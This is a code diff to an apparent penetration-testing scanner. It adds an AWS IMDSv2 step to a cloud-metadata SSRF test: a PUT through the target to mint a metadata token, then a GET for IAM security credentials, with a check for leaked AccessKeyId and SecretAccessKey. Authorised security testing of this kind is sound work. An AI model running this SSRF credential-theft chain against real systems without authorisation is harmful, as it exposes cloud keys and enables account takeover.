@@ -11,6 +11,7 @@ async def test_cloud_metadata_impl(
     path: str = "/",
     injection_point: str = "query",
     extra_headers: dict | None = None,
+    imdsv2: bool = False,
 ) -> dict:
     """Test SSRF to cloud metadata + container-credential services (AWS/GCP/Azure/DO/Alibaba/Oracle).
 
@@ -79,6 +80,43 @@ async def test_cloud_metadata_impl(
             lines.append(f"  [{name}] Possible — 200 OK, {len(body)}B response (review manually)")
         else:
             lines.append(f"  [{name}] Not vulnerable ({status})")
+
+    # IMDSv2 two-step (default on modern EC2): a plain GET-only SSRF can't reach
+    # it, but a header/method-forwarding SSRF can — PUT a token, then GET the IAM
+    # creds carrying that token. Gated on imdsv2=True (operator confirms the SSRF
+    # forwards method + headers, e.g. gopher / full-request SSRF).
+    if imdsv2:
+        import re as _re
+        tok_url = "http://169.254.169.254/latest/api/token"
+        tok_path = (f"{path}?{parameter}={tok_url}" if injection_point == "query" else path)
+        tok_req = {"session": session, "method": "PUT", "path": tok_path,
+                   "headers": {**(extra_headers or {}),
+                               "X-aws-ec2-metadata-token-ttl-seconds": "21600"}}
+        if injection_point == "body":
+            tok_req["path"] = path
+            tok_req["data"] = f"{parameter}={tok_url}"
+        tok_resp = await client.post("/api/session/request", json=tok_req)
+        token = ""
+        if "error" not in tok_resp:
+            m = _re.search(r"[A-Za-z0-9_\-=]{40,}", tok_resp.get("response_body", ""))
+            token = m.group(0) if m else ""
+        if token:
+            creds_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+            cr_path = (f"{path}?{parameter}={creds_url}" if injection_point == "query" else path)
+            cr_req = {"session": session, "method": "GET", "path": cr_path,
+                      "headers": {**(extra_headers or {}), "X-aws-ec2-metadata-token": token}}
+            if injection_point == "body":
+                cr_req["path"] = path
+                cr_req["data"] = f"{parameter}={creds_url}"
+            cr = await client.post("/api/session/request", json=cr_req)
+            cbody = cr.get("response_body", "") if "error" not in cr else ""
+            if any(i in cbody for i in ("AccessKeyId", "SecretAccessKey")):
+                vulns.append("CRITICAL: AWS IMDSv2 — token minted + IAM creds leaked")
+                lines.append("  [AWS IMDSv2] VULNERABLE — token PUT succeeded, IAM creds returned")
+            else:
+                lines.append("  [AWS IMDSv2] token minted but creds fetch did not leak (review)")
+        else:
+            lines.append("  [AWS IMDSv2] no token (SSRF not forwarding PUT+header, or IMDSv2 off)")
 
     if vulns:
         lines.append(f"\n*** {len(vulns)} CLOUD METADATA LEAKS ***")
